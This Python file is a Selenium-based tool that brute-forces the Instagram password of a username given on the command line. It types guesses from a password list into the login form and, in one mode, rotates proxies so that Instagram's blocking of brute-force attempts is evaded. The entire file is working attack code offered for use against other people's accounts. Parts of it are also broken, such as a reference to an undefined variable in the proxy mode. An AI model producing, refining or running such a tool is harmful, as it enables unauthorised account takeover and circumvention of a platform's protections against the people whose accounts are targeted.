import time
import sys
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
colorama_init()

check_auth = 0
filename = "passwords.txt"
ig_username = sys.argv[1]


def countdown(t):

    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        t -= 1

    print('Fire in the hole!!!')


def remove_first_n_lines(filename, n):
    with open(filename, 'r') as f:
        lines = f.readlines()

    with open(filename, 'w') as f:
        f.writelines(lines[n:])
    f.close()


print("1: Change IP Address Forever (Slow and Safe Cracking Option)")
print("2: Keep using same ip address, but timeout often (Fast and Unsafe Cracking Option)\n")
connection_option = input("Pick a technique by writing number> ")
if int(connection_option) == 1:
    proxy_list = input("Type proxy list file name and extension(proxy_list.txt)> ")
    password_list = open("passwords.txt", "r")
    password_list_lines = password_list.readlines()

    circuits_open = open(proxy_list, "r")
    circuit_lines = circuits_open.readlines()

    for circuits in circuit_lines:
        # 5 password per ip address; Change ip address to avoid instagram block brute-force
        PROXY = circuits.strip()
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--proxy-server=%s' % PROXY)

        browser = webdriver.Chrome(options=chrome_options)

        browser.get('https://www.instagram.com/')

        # tells selenium to wait 10 seconds before trying again if it can't find something
        browser.implicitly_wait(10)

        try:
            browser.find_element(
                by=By.XPATH, value="//button[contains(., 'Allow all cookies')]").click()
        except:
            pass

        username = browser.find_element(by=By.NAME, value='username')
        password = browser.find_element(by=By.NAME, value='password')

        username.send_keys(ig_username)

        for x in password_list_lines:
            print("Trying password> "+x)
            password.send_keys(x)
            btn_1 = browser.find_element(
                by=By.XPATH, value="//button[contains(., 'Log in')]")
            browser.execute_script("arguments[0].click();", btn_1)
            time.sleep(10)
            if browser.current_url.startswith("https://www.instagram.com/account"):
                print(f"\n{Fore.GREEN}Cracked Password > {dd[0]}{Style.RESET_ALL}")
                check_auth = 1
                remove_first_n_lines(filename, 1)
                break
            else:
                password.send_keys(Keys.CONTROL + "a")
                password.send_keys(Keys.DELETE)
        browser.quit()
else:
    try:
        while True:
            if check_auth == 1:
                break
            else:
                password_list = open("passwords.txt", "r")
                password_list_lines = password_list.readlines()

                browser = webdriver.Chrome()

                # opens firefox to instagram#
                browser.get('https://www.instagram.com/')

                # tells selenium to wait 10 seconds before trying again if it can't find something
                browser.implicitly_wait(10)

                try:
                    browser.find_element(
                        by=By.XPATH, value="//button[contains(., 'Allow all cookies')]").click()
                except:
                    pass

                username = browser.find_element(by=By.NAME, value='username')
                password = browser.find_element(by=By.NAME, value='password')

                username.send_keys(ig_username)
                vv = 0
                dd = []
                for x in password_list_lines:
                    dd.append(x)
                    if len(dd) >= 5:
                        break
                    else:
                        vv += 1
                print("Trying password> "+dd[0])
                password.send_keys(dd[0])
                btn_1 = browser.find_element(
                    by=By.XPATH, value="//button[contains(., 'Log in')]")
                browser.execute_script("arguments[0].click();", btn_1)
                time.sleep(100)
                if browser.current_url.startswith("https://www.instagram.com/account"):
                    print(
                        f"\n{Fore.GREEN}Cracked Password > {dd[0]}{Style.RESET_ALL}")
                    check_auth = 1
                    password_list.close()
                    remove_first_n_lines(filename, 0)
                    break
                else:
                    password.send_keys(Keys.CONTROL + "a")
                    password.send_keys(Keys.DELETE)

                print("Trying password> "+dd[1])
                password.send_keys(dd[1])
                btn_2 = browser.find_element(
                    by=By.XPATH, value="//button[contains(., 'Log in')]")
                browser.execute_script("arguments[0].click();", btn_2)
                time.sleep(100)
                if browser.current_url.startswith("https://www.instagram.com/account"):
                    print(
                        f"\n{Fore.GREEN}Cracked Password > {dd[1]}{Style.RESET_ALL}")
                    check_auth = 1
                    password_list.close()
                    remove_first_n_lines(filename, 1)
                    break
                else:
                    password.send_keys(Keys.CONTROL + "a")
                    password.send_keys(Keys.DELETE)

                print("Trying password> "+dd[2])
                password.send_keys(dd[2])
                btn_3 = browser.find_element(
                    by=By.XPATH, value="//button[contains(., 'Log in')]")
                browser.execute_script("arguments[0].click();", btn_3)
                time.sleep(100)
                if browser.current_url.startswith("https://www.instagram.com/account"):
                    print(
                        f"\n{Fore.GREEN}Cracked Password > {dd[2]}{Style.RESET_ALL}")
                    check_auth = 1
                    password_list.close()
                    remove_first_n_lines(filename, 2)
                    break
                else:
                    password.send_keys(Keys.CONTROL + "a")
                    password.send_keys(Keys.DELETE)

                print("Trying password> "+dd[3])
                password.send_keys(dd[3])
                btn_4 = browser.find_element(
                    by=By.XPATH, value="//button[contains(., 'Log in')]")
                browser.execute_script("arguments[0].click();", btn_4)
                time.sleep(100)
                if browser.current_url.startswith("https://www.instagram.com/account"):
                    print(
                        f"\n{Fore.GREEN}Cracked Password > {dd[3]}{Style.RESET_ALL}")
                    check_auth = 1
                    password_list.close()
                    remove_first_n_lines(filename, 3)
                    break
                else:
                    password.send_keys(Keys.CONTROL + "a")
                    password.send_keys(Keys.DELETE)

                print("Trying password> "+dd[4])
                password.send_keys(dd[4])
                btn_5 = browser.find_element(
                    by=By.XPATH, value="//button[contains(., 'Log in')]")
                browser.execute_script("arguments[0].click();", btn_5)
                time.sleep(10)
                if browser.current_url.startswith("https://www.instagram.com/account"):
                    print(
                        f"\n{Fore.GREEN}Cracked Password > {dd[4]}{Style.RESET_ALL}")
                    check_auth = 1
                    password_list.close()
                    remove_first_n_lines(filename, 4)
                    break
                else:
                    password.send_keys(Keys.CONTROL + "a")
                    password.send_keys(Keys.DELETE)

                n = 5
                remove_first_n_lines(filename, n)
                print("\nBypassing Instagram Firewall")
                browser.quit()
                countdown(350)
    except:
        pass


if check_auth == 0:
    print(
        f"\n{Fore.RED}No Results. Try again with stronger password list.{Style.RESET_ALL}")
else:
    print(f"\n{Fore.YELLOW}(!IMPORTANT!)If you didn't see green colored Cracked Password text appear showing the password of the target username. Run the script again, if you see this yellow text you are cracked the password but password didn't appear on the screen because of low hardwares currently using by the pc, notebook or phone.{Style.RESET_ALL}")
